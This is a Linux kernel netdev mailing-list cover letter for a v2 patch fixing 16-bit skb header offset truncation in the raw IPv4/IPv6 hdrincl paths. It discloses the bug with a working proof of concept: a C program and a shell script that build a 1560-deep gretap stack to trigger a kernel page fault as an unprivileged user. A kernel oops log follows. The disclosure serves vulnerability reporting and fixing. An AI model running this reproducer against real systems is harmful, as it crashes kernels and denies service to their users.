Received: from mail-pz2-f0.google.com (mail-pz2-f0.google.com [74.125.228.0])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7FA8E259498
	for <netdev@vger.kernel.org>; Fri, 31 Jul 2026 21:09:17 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.0
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785532159; cv=none; b=j9V9jXAhKXD7T7pcffe24IY0ZNWoup/pd64ajMM0Px7F0QOE6VmLFtVmmjuPvcFV26AFGomvG+D98y/dFDQY6lGrmFQZ2akjBKJ6kKKxCg3ExFhy7bBF6Gac2fVVLxbVk9LnrHHaxVa+B5BJWdVh1e3mwY2t7InVQ7pXlmh1BBI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785532159; c=relaxed/simple;
	bh=gDiKmsR5vacBRG1fxm/OoqylcO8Do2ZRTUuMgjMgeeQ=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=V/i1PWaWV6y4KmjWFWoOMTF6nSpXxGk6Gdm///vMAfAeJwvCWhlIn37tF/FPTevlmfQ0kBf3ADf6z0DCYCg+JCdrAdIrGcWF8o11bHK6sptl/RPIwCWeLp7wNKVrrjiOWT4xSApyJLavGIaETc1s926TZyTmyzWZw3XblyzaM2Y=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=NXovERhk; arc=none smtp.client-ip=74.125.228.0
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="NXovERhk"
Received: by mail-pz2-f0.google.com with SMTP id 41be03b00d2f7-cbb92a1213fso467706a12.0
        for <netdev@vger.kernel.org>; Fri, 31 Jul 2026 14:09:17 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785532157; x=1786136957; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=H5PrjLmqvwSGoDasNJO+Kpjd5myocZl+fJ2MDiNWmeE=;
        b=NXovERhkY5CdqQAjRtKqkSUVpvJ2H9D0j27KQHE1sMx4aKVh3xGHlqxkfo5ROkPMFZ
         9gRQbY2XvIvcxe77g4g70jg0WkM526Ed5+R+ZKqlBFNR6O6giTujJwfjhd1qbVg1uLcI
         tVyeM1PGlRfWqOdD0MtzAERN8DcZWOVqkdKbBr1KdEiJSSsjsEWgH9ILEmpbd55eTAXI
         syXEFjKaCiRcprFNN/lbao7863/Ip0q2pHKH16DgGIEDcjlr3KECUiKpLVTdh0zOKGq7
         exbE5MLlqkbK6UEgiWtzteFL1HqoIxBHIOmnwwyLYMoxNywI/qm8AmXl7DNLYyitYhF7
         FikA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785532157; x=1786136957;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=H5PrjLmqvwSGoDasNJO+Kpjd5myocZl+fJ2MDiNWmeE=;
        b=HUP49jjQDhBgq0D2ABtmDnRF4MPNCSg1TaCmk7vlds4+OxJclE8ORrbm8AtFauE3kR
         ow1y94iPqfeZfKdeDv+08b+PErVCvuOzsyHepCUbi5BKiws1+JzEbT3te6Q5tQJTFoPZ
         qeogIa5dov6XpPZejtg93+o8HDastOcNG6M+FSF47ropAIODVbOz3CKz9JWEKhzpwaU8
         dOVKRglDj+3V7ElrVbm/26wMfwbUZO2WutHgqjCpwySCjT9reVS+zP14IC8SM/VZy/NQ
         OEz4iiYTtfyIk3u5AW6QGYQthfKsfyd/qvXX34OBZMIMCy6ullM+3vZiEQwPadcZwoRj
         rkvA==
X-Gm-Message-State: AOJu0Yy2caHu7irZu7KKXUf1bbpsTWWvGmgLZ0TjC/SK8YOWUuexIYN2
	mRJYf5qnUKdhbDXnLzMYVNhaXEDGdy+4yeeS3tmcWIdxvpGrxA/yJDsh3GN0+Q3C2tixPAjjPvT
	V8NFy8ul8lW8=
X-Gm-Gg: AR+sD121zJ8LLh5NlQ/LeNV+1nz7G8ThqWwGPN9e8a7H5lY50gPvOvSd4BE8qp7tRTv
	If5UXVeX/eULtKeD+/w5KaKGzXn2Lj8Og4PygTGPwbEuqiJKi/x1i+Xvjqq9P0lpGie/Yn2M7uW
	Nc8BpSrnb+xRRxctamigthcVqp2vCv8DnPyHjpWWPO24b9wIoMkU4JXZ2gDnpFzevXl3+EDLLjP
	4b5fPCNXKupb9Z6xabA/6bh0Zg/dq8vPSZqcE+7wRYKJrkaVF0h/jFisUepAB9Bz7wyhdYGxW8R
	8ggh8t1UTLLZD0RrVoQXNlwEXkqs2c8Fa5ahb7geRDTQIMiOMVzE8absh30DK6xLHnnq2H9vpdW
	x/ZruSCczpascP+0AfAeVMk1OLlmjtEUVLl6SjIhenhk1WDYV0Br2JON1UPB6Ox/Y7723vJGWD3
	rzbnJz5RIchdb2pu+DftaNp+xHDwTKzONqcZGdW6wVsgdOsAdMMiRx8tM+9xgUFn4Lzfe66ZD3x
	zk+d55qDQ==
X-Received: by 2002:a05:6a00:2e93:b0:84e:23a:14ba with SMTP id d2e1a72fcca58-84ee496ea16mr940489b3a.55.1785532156620;
        Fri, 31 Jul 2026 14:09:16 -0700 (PDT)
Received: from localhost.localdomain ([115.192.250.185])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84edc29c73bsm923375b3a.29.2026.07.31.14.09.11
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 31 Jul 2026 14:09:16 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	steffen.klassert@secunet.com,
	herbert@gondor.apana.org.au,
	kerneljasonxing@gmail.com,
	kuniyu@google.com,
	bjorn@kernel.org,
	bigeasy@linutronix.de,
	jiayuan.chen@linux.dev,
	gustavoars@kernel.org,
	jlayton@kernel.org,
	runyu.xiao@seu.edu.cn,
	kees@kernel.org,
	willemb@google.com,
	lirongqing@baidu.com,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net v2 0/1] net: skbuff: reject skb header offset updates that truncate
Date: Fri, 31 Jul 2026 21:08:44 +0000
Message-ID: <cover.1785529351.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv4/raw.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

raw_send_hdrinc() and rawv6_send_hdrinc() reserve LL headroom before storing
skb header offsets in 16-bit fields. Since commit 1a37e412a022 ("net: Use
16bits for *_headers fields of struct skbuff"), these offsets must stay
representable, and U16_MAX is also the unset sentinel for transport_header.

With a deep gretap stack, LL_RESERVED_SPACE(dev) can grow to 65536. On the
IPv4 hdrincl path, skb_reserve(skb, hlen) followed by
skb_reset_network_header(skb) stores skb->data - skb->head in the 16-bit
network_header field. When hlen reaches 65536, that stored offset truncates to
0. raw_send_hdrinc() then copies the userspace IPv4 header to ip_hdr(skb) at
the wrapped offset, and the malformed skb later faults in eth_header().

IPv4 also has a second boundary at hlen + iphlen, because the transport header
is advanced by the user-controlled IPv4 header length and U16_MAX itself is
not a valid stored transport offset. The initial raw route is also not the
only place that matters: LOCAL_OUT can reroute the skb, XFRM can add
additional headroom, and later output/GSO paths can grow the skb head or
recompute transport_header from network_header. Those later positive updates
can overflow the same 16-bit state after the skb leaves raw.c.

This patch keeps the raw IPv4/IPv6 hdrincl entry bounds and adds checked
helpers for later positive skb header offset updates and transport_header
recomputations. The checked helpers reject values before they would overflow
the stored 16-bit fields or turn transport_header into the U16_MAX sentinel,
and the affected skb expansion, GSO, XFRM, ESP offload, and IPTFS output
paths now propagate that failure instead of silently producing a truncated
header offset.

The reproducer below exercises the IPv4 hdrincl crash path. The IPv6,
XFRM, ESP offload, and IPTFS changes close the same 16-bit skb
header offset invariant for later positive offset updates and
transport-header recomputations found by code inspection.

We did not use packetdrill for the reproducer because the trigger depends on
constructing a very deep gretap device stack so that LL_RESERVED_SPACE(dev)
reaches the truncation boundary before the raw hdrincl send. packetdrill can
express the final packet send, but not this device-topology setup as the main
trigger condition.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc
    Actual trigger wrapper used in validation:
    unshare -Urn ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <netinet/ip.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static uint16_t ip_checksum(const void *buf, size_t len)
{
	const uint8_t *p = buf;
	uint32_t sum = 0;

	while (len > 1) {
		sum += ((uint32_t)p[0] << 8) | p[1];
		p += 2;
		len -= 2;
	}

	if (len)
		sum += (uint32_t)p[0] << 8;

	while (sum >> 16)
		sum = (sum & 0xffffU) + (sum >> 16);

	return (uint16_t)~sum;
}

int main(int argc, char **argv)
{
	static const char payload[] = "ABCD";
	const char *ifname = argc > 1 ? argv[1] : "g1560";
	const char *dst_str = argc > 2 ? argv[2] : "192.0.2.2";
	const char *src_str = argc > 3 ? argv[3] : "192.0.2.1";
	struct sockaddr_in dst = {
		.sin_family = AF_INET,
	};
	struct iphdr iph = {
		.version = 4,
		.ihl = 5,
		.tos = 0,
		.tot_len = htons(sizeof(struct iphdr) + sizeof(payload) - 1),
		.id = htons(0x1234),
		.frag_off = 0,
		.ttl = 64,
		.protocol = 253,
		.check = 0,
	};
	unsigned char packet[sizeof(iph) + sizeof(payload) - 1];
	int fd;
	ssize_t n;

	if (inet_pton(AF_INET, src_str, &iph.saddr) != 1) {
		fprintf(stderr, "bad src %s\n", src_str);
		return 1;
	}
	if (inet_pton(AF_INET, dst_str, &iph.daddr) != 1) {
		fprintf(stderr, "bad dst %s\n", dst_str);
		return 1;
	}
	if (inet_pton(AF_INET, dst_str, &dst.sin_addr) != 1) {
		fprintf(stderr, "bad sockaddr dst %s\n", dst_str);
		return 1;
	}

	iph.check = ip_checksum(&iph, sizeof(iph));
	memcpy(packet, &iph, sizeof(iph));
	memcpy(packet + sizeof(iph), payload, sizeof(payload) - 1);

	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (fd < 0) {
		perror("socket");
		return 1;
	}

	{
		int one = 1;

		if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
			perror("setsockopt(IP_HDRINCL)");
			close(fd);
			return 1;
		}
		if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, ifname,
			       strlen(ifname) + 1) < 0) {
			perror("setsockopt(SO_BINDTODEVICE)");
			close(fd);
			return 1;
		}
	}

	n = sendto(fd, packet, sizeof(packet), 0,
		   (struct sockaddr *)&dst, sizeof(dst));
	if (n < 0) {
		perror("sendto");
		close(fd);
		return 1;
	}

	printf("sent %zd bytes via %s to %s\n", n, ifname, dst_str);
	close(fd);
	return 0;
}
------END poc.c--------

------BEGIN poc.sh------
#!/bin/sh
set -eu

DEPTH="${DEPTH:-1560}"
TOP="g${DEPTH}"

if ip route show default 2>/dev/null | grep -q .; then
	echo "run inside an isolated netns, e.g. unshare -n $0 or unshare -Urn $0" >&2
	exit 1
fi

ip link add dummy0 type dummy
ip link set dummy0 up mtu 100000

lower="dummy0"
i=1
while [ "$i" -le "$DEPTH" ]; do
	a=$(( (i / 250) % 250 + 1 ))
	b=$(( i % 250 + 1 ))
	lip="10.${a}.${b}.1"
	rip="10.${a}.${b}.2"
	ip link add "g${i}" type gretap local "${lip}" remote "${rip}" dev "${lower}" key 1
	lower="g${i}"
	i=$((i + 1))
done

ip link set "${TOP}" up
ip addr add 192.0.2.1/24 dev "${TOP}"
ip neigh replace 192.0.2.2 lladdr 02:11:22:33:44:55 nud permanent dev "${TOP}"

exec ./poc "${TOP}" 192.0.2.2 192.0.2.1
------END poc.sh--------

----BEGIN crash log----
[   52.208710] BUG: unable to handle page fault for address: ffffa3986611fffe
[   52.220274] #PF: supervisor write access in kernel mode
[   52.228822] #PF: error_code(0x0002) - not-present page
[   52.249792] Oops: Oops: 0002 [#1] SMP NOPTI
[   52.313650] RIP: 0010:eth_header (net/ethernet/eth.c:86)
[   52.585894] Call Trace:
[   52.591902]  neigh_resolve_output (include/linux/netdevice.h:3503 net/core/neighbour.c:1611 net/core/neighbour.c:1596)
[   52.597910]  ip_finish_output2 (include/net/neighbour.h:560 (discriminator 2) net/ipv4/ip_output.c:236 (discriminator 2))
[   52.603665]  ip_output (net/ipv4/ip_output.c:443 net/ipv4/ip_output.c:324 include/linux/netfilter.h:307 net/ipv4/ip_output.c:437)
[   52.616159]  raw_sendmsg (net/ipv4/raw.c:677)
[   52.638531]  __sys_sendto (net/socket.c:775 (discriminator 1) net/socket.c:790 (discriminator 1) net/socket.c:2252 (discriminator 1))
[   52.643321]  __x64_sys_sendto (net/socket.c:2259 net/socket.c:2255 net/socket.c:2255)
[   52.648330]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[   52.653123]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
-----END crash log-----

Best regards,
Zihan Xi

changes in v2:
  - Keep skb_segment() default error code after successful checked header
    offset updates to avoid returning ERR_PTR(0), as reported by the kernel
    test robot.
  - Extend the checked update coverage to XFRM, ESP offload, and IPTFS
    transport-header recomputation paths instead of relying on raw hdrincl
    entry guards alone.
  - v1 Link: https://lore.kernel.org/all/cover.1785346409.git.zihanx@nebusec.ai/

---
 net/ipv4/esp4_offload.c |  15 +++--
 net/ipv4/raw.c          |   4 ++
 net/ipv6/esp6_offload.c |  15 +++--
 net/ipv6/raw.c          |   4 ++
 net/xfrm/xfrm_device.c  |  45 ++++++++++-----
 net/xfrm/xfrm_iptfs.c   |   6 +-
 net/xfrm/xfrm_output.c  |  21 ++++---
 9 files changed, 221 insertions(+), 41 deletions(-)

-- 
2.43.0

